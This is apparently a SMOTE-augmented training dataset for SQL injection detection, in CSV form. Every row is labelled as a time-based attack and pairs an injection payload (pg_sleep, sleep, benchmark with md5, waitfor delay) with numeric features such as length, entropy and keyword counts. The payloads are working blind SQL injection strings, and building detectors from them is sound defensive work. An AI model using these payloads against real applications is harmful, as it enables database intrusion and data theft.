id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000222,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,0.25736604419529957,66.2551828030979,23.25103656061958,3.5063493379132735,19.313795700774474,10.502073121239158,27.37655484092937,9.062759140154895,0.2916829406862409,0.15748107237096223,0.4136807473261115,0.13715523961668546,0.0,1.0,2.0,0.0,0.0,1.0627591401548946,0.0,4.0,0.0,1.0,0.0,3.0627591401548946,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0627591401548947,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0627591401548946
SMOTE_000223,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,1.348595120062534,94.61588616822235,24.274007114486103,2.98891390865823,30.0,2.0,49.16390039719456,13.451985771027793,0.31903656017443466,0.021269104011628986,0.5174131888044878,0.14228114700944855,0.725992885513897,0.274007114486103,0.0,0.0,1.0,0.0,0.0,10.177978656541692,0.27400711448610304,0.0,0.0,1.0000000000000002,0.725992885513897,0.27400711448610304,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000224,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,0.04344039337353585,72.2030652079343,22.0,3.4039627902386784,15.0,18.0,30.162452166347435,9.040613041586859,0.20778391448069727,0.2493406973768367,0.41767759735551707,0.12519779078694898,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,4.040613041586859,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000225,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000031,2.8585856826928753,76.7341207036329,20.209748772466543,3.009089037713203,23.262924631739963,4.788773895219888,37.57754779043977,11.104874386233272,0.3139592071313525,0.05273858676421686,0.48849091152282664,0.14481129458160405,0.0,3.420974877246654,0.0,0.0,0.0,1.0,0.0,6.2629246317399625,0.0,0.0,0.4209748772466543,1.0000000000000002,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5790251227533456,0.0,0.0,0.0,1.0,0.4209748772466542,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000226,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000026,1.0726942480465098,85.84964314596097,27.0,3.7564130318297133,33.3460746055707,11.20285483231222,31.300713708078057,10.0,0.3882387012271472,0.13063598961959522,0.36464055285498254,0.116484756298275,0.0,3.548929437882918,0.30071370807805475,0.0,0.0,1.1503568540390274,0.0,4.0,0.0,1.0,0.0,1.4510705621170823,0.0,1.0,0.15035685403902738,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.15035685403902746,1.0,1.6992862919219451,0.15035685403902743,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000227,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000022,1.1641956875243455,76.98886886387766,19.65924590925177,2.9843176586160385,27.329622954625886,2.0,38.32962295462588,9.329622954625885,0.3549886551010777,0.025986386121293253,0.4979137787681906,0.12111118000943843,0.0,0.3296229546258849,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.3296229546258849,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.329622954625885,0.6703770453741149,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000228,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,0.9588903362126174,67.21506615096139,25.188666432255175,3.611060389186522,21.701866291608283,10.0,27.513199859353108,8.0,0.3212099581831233,0.14938764080219544,0.4098922883729249,0.11951011264175634,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.8377332864510354,0.16226671354896466,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8377332864510354,0.0,0.0,0.8377332864510354,0.1622667135489646,0.8377332864510354,0.0,0.0,0.0,0.0,0.0,0.0,0.16226671354896466,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8377332864510354
SMOTE_000229,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000024,3.6393005631616533,62.45222982699731,23.544131329712748,3.7077491876060558,20.088262659425492,11.272065664856374,22.455868670287252,8.636032832428187,0.3191872113638512,0.1801744059129169,0.3623699302922356,0.1382684524309964,1.2720656648563733,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,2.727934335143627,0.0,0.0,0.36396716757181335,3.0,0.6360328324281866,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6360328324281868,0.0,0.36396716757181335,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.36396716757181335,0.0,0.6360328324281865,0.6360328324281865,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.636032832428187
SMOTE_000230,attack,time,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000018,0.30322920355894756,94.20104609703795,27.733682032345982,3.816621198387514,19.77806836028832,29.467364064691964,34.0,10.955613672057664,0.20982851295784433,0.31214876325831825,0.36160826147651537,0.11641446230732203,0.9556136720576638,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,4.0,0.9556136720576638,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9556136720576639,0.0,0.0,0.0,1.0,0.0,0.9556136720576638,0.04438632794233621,0.0,0.0,0.0,0.0,0.0,0.0,0.04438632794233621,0.9556136720576639,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000231,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000016,0.49026484656209907,80.35890126262977,21.388257503608504,3.0868857499725575,29.164772510825518,1.9029356240978732,39.09706437590213,10.194128751804252,0.3617759348035364,0.02390283269068634,0.4875011482855189,0.1268200842202584,0.2911931277063786,0.9029356240978736,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0000000000000002,0.09706437590212641,0.9029356240978735,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000232,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000019,1.064983545896889,84.63516707439265,26.0,3.607627924178261,28.993418909159605,10.0,34.45933170242938,11.182416462803673,0.34213329949998494,0.1181641855784654,0.4075241220767597,0.13217839284478994,3.452750611588983,-1.1102230246251565e-16,0.3648329256073446,0.0,0.0,1.8175835371963278,0.0,4.547249388411017,0.0,1.0,0.0,2.182416462803672,1.0,0.0,0.1824164628036723,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.8175835371963278,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.817583537196328
SMOTE_000233,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000005,1.6543289693209604,60.98179381404736,17.203641237190528,2.75107405109371,14.672735395317547,1.2654529209364913,32.98179381404736,12.061811683745963,0.24674396113751035,0.020260483108999167,0.5359381644233251,0.19705739133016542,3.2654529209364904,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,5.796358762809472,1.2654529209364906,0.7345470790635094,0.0,1.0000000000000002,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7345470790635094,0.0,0.0,0.0,1.2654529209364906,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2654529209364907,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2654529209364904
SMOTE_000234,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,1.494679460109341,96.07853592727051,22.691098054547123,2.954481591558404,30.764392218188483,1.769633981817627,50.005241763629144,13.539267963635252,0.3212445448620672,0.018345795852097196,0.5196038185264039,0.1408058407594316,0.6910980545471208,0.7696339818176262,0.0,0.0,1.0,0.0,0.0,10.30890194545288,0.0,0.0,0.0,1.0000000000000002,0.2303660181823737,0.7696339818176262,0.0,0.7696339818176263,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000235,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000002,2.3987162374995865,86.45015988612737,26.985759967464965,3.4239706698997945,22.46439991866241,13.943039869859852,39.02848006507007,11.014240032535037,0.25910870087368576,0.1596747938871612,0.45313350603341285,0.12808299920574023,0.5071200162675186,-1.1102230246251565e-16,2.0,0.0,0.0,1.4928799837324815,0.0,6.014240032535037,0.0,1.0,0.0,3.4928799837324815,0.5071200162675185,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.4928799837324815,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4928799837324815
SMOTE_000236,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,1.0956189487423047,67.49385491965137,23.41564248660856,3.4715472978886464,19.0,10.0,28.662569946434242,9.831284973217121,0.2820404672863758,0.14844235120335567,0.4242108263678524,0.14530635514241616,0.0,1.0,2.0,0.0,0.0,1.0,0.0,4.415642486608561,0.4156424866085605,1.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000237,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000016,1.6251659344414437,77.61958259386682,20.079721729244547,3.0045132330571107,27.539860864622273,2.0,38.53986086462228,9.539860864622273,0.35481357356377224,0.0257762882765267,0.49658315908466916,0.12282697907503189,0.0,0.539860864622274,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0000000000000002,0.0,0.5398608646222741,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.5398608646222741,0.4601391353777258,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000238,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000017,1.3609502682588532,89.22775923894638,23.922216925413252,3.336010343465287,36.76665077623976,1.2694457686466887,39.73055423135331,11.461108462706626,0.4097166398029729,0.014676833706981834,0.44723440505757495,0.12837212143247034,2.1916626940599384,0.2694457686466872,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0000000000000002,0.7305542313533128,0.26944576864668723,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000239,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000026,1.4827241155775368,80.96305407153876,24.6913997827886,3.5749289194565,32.27165428875016,8.111145276827038,30.79012725298078,9.790127252980781,0.39603439165953813,0.0952603062812711,0.386364641323827,0.12234066073536376,0.0,3.790127252980782,0.0,0.0,0.0,1.0,0.0,4.209872747019218,0.0,0.7901272529807819,0.0,1.0000000000000002,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.7901272529807819,1.7901272529807821,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2098727470192181,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.790127252980782
SMOTE_000240,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000020,2.411253740782321,86.53180697171848,27.009087706205282,3.4282717915734033,22.522719265513203,14.036350824821126,38.981824587589436,10.990912293794718,0.2595380936550504,0.16060228229490878,0.45216698191826843,0.1276926421317724,0.4954561468973593,-1.1102230246251565e-16,2.0,0.0,0.0,1.5045438531026407,0.0,5.990912293794718,0.0,1.0,0.0,3.504543853102641,0.4954561468973592,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5045438531026407,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.504543853102641
SMOTE_000241,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000017,1.802808792289598,94.1114246073698,24.166431544472655,3.265976313630322,36.665726177890626,1.2778561518424496,43.612129973951824,12.555712303684896,0.39080540408480613,0.013493980436091096,0.4624178143534783,0.1332828011256244,2.1664315444726556,0.2778561518424479,0.0,0.0,1.0,0.0,0.0,8.833568455527345,0.0,0.0,0.0,1.0000000000000002,0.7221438481575521,0.27785615184244794,0.0,0.27785615184244794,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000242,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000029,0.4070916665836315,73.5310922758042,26.133138458765583,3.6226783953550115,15.332846146913955,21.59912306444512,28.399415376296744,8.199707688148372,0.20847931848548856,0.29327250334037436,0.38682563207176146,0.11142254610237562,1.0,-1.1102230246251565e-16,0.13313845876558195,0.0,0.0,1.0665692293827909,0.0,5.0,0.0,0.0,1.0,1.199707688148373,1.0,0.0,0.06656922938279097,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.06656922938279097,0.0,0.06656922938279097,0.9334307706172089,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0665692293827913
SMOTE_000243,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000026,0.31652184126177424,85.94782617051402,26.947826170514023,3.762447342652858,34.7913046820561,10.0,31.10434765897195,10.052173829485975,0.40477131144854084,0.11635044299519286,0.3619139928024149,0.11696425275385139,0.2086953179439015,3.7913046820560985,0.0,0.0,0.0,1.0521738294859755,0.0,4.0,0.0,1.0,0.0,1.0521738294859755,0.052173829485975376,0.9478261705140245,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000244,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000028,0.010780455826995695,57.00916043892185,24.00114505486523,3.6426424987033457,18.005725274326156,10.002290109730462,21.99885494513477,7.002290109730462,0.3158330506709845,0.1754491044171168,0.38589290208269933,0.1228249428291993,0.0022901097304622864,0.9988549451347688,2.0,0.0,0.0,1.0,0.0,2.998854945134769,0.0,0.0,0.0,3.0,0.0011450548652312542,0.9988549451347687,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.9988549451347688,0.0,0.0,0.0,0.0,0.0,0.0,0.9988549451347688,0.0,0.001145054865230987,0.001145054865230987,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000245,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000004,0.2006627510993068,59.12436742374908,23.04145580791636,3.6307316848504407,21.04145580791636,10.04145580791636,21.97927209604182,6.062183711874541,0.35588896395523717,0.1698050113245305,0.3718490144312875,0.10245701028894483,1.0207279039581802,-1.1102230246251565e-16,0.04145580791636028,0.0,0.0,1.0,0.0,2.97927209604182,0.0,0.0,0.0,1.0414558079163603,1.0,0.0,0.02072790395818014,0.9792720960418198,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9792720960418199,0.0,0.020727903958180034,0.020727903958180034,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0207279039581802
SMOTE_000246,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,0.18077546765756186,98.90380122344187,23.90380122344187,2.891454750242346,29.903801223441874,2.0,53.0,14.0,0.302339090327761,0.02022205535281854,0.5358844668496908,0.14155438746972965,0.9519006117209359,0.048099388279064126,0.0,0.0,1.0,0.0,0.0,11.0,0.0,0.0,0.0,1.0000000000000002,0.9519006117209358,0.04809938827906429,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.048099388279064015,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.048099388279065
SMOTE_000247,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000011,0.23126830950197166,71.57682646071203,23.0,3.4988499085404734,17.130207242857836,18.707033703569866,27.804689135713243,7.934896378571081,0.24001150462656773,0.260816083781427,0.3883678147060774,0.11080459688592786,0.03255181071445923,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,4.934896378571081,0.0,0.0,0.9674481892855408,1.0000000000000002,0.03255181071445934,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9674481892855409,0.0,0.0,0.0,0.03255181071445917,0.0,0.0,0.9674481892855409,0.0,0.0,0.0,0.0,0.0,0.0,0.03255181071445923,0.9674481892855409,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000248,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000002,2.3789074342369267,86.42166817154246,26.977619477583563,3.4224697427052453,22.444048693958905,13.910477910334247,39.044761044832875,11.022380522416439,0.2589588591924685,0.15935113585573196,0.4534707860358618,0.1282192189159377,0.5111902612082191,-1.1102230246251565e-16,2.0,0.0,0.0,1.488809738791781,0.0,6.022380522416438,0.0,1.0,0.0,3.488809738791781,0.5111902612082191,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.4888097387917808,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.488809738791781
SMOTE_000249,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000003,1.75713986044561,67.40571527154147,24.937143514360976,3.605864354075556,20.87428702872195,10.0,27.468571757180488,9.062856485639024,0.3091775041142646,0.14842838104624184,0.40754752385645426,0.1348465909830393,0.5314282428195118,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,4.0,0.5314282428195118,1.0,0.0,3.0,0.5314282428195118,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000250,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,2.2717444265101516,59.47403199304474,22.228359994203952,3.464065611352891,16.965375990726322,10.0,24.017312004636842,8.49134399768158,0.28337320246941156,0.16844280174287518,0.40575250442963845,0.1424314913580748,0.7370159965223705,-1.1102230246251565e-16,1.5086560023184195,0.0,0.0,1.0,0.0,3.7543280011592097,0.0,0.0,0.7543280011592097,3.0,0.24567199884079036,0.0,0.7543280011592097,0.24567199884079027,0.0,1.0,1.0,0.0,0.0,0.0,0.2456719988407903,0.24567199884079027,0.0,0.24567199884079025,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4913439976815805
SMOTE_000251,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000007,0.6456352172879686,57.87460296566995,21.376191102990152,3.371606567413624,15.376191102990152,10.0,24.623808897009845,7.874602965669949,0.265789485628669,0.17279309447770735,0.4253828922821604,0.13603452761146323,0.0,0.12539703433005106,2.0,0.0,0.0,1.0,0.0,3.8746029656699488,0.0,0.0,0.8746029656699489,3.0,0.0,0.12539703433005112,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.12539703433005114,0.0,0.8746029656699489,0.12539703433005112,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1253970343300512
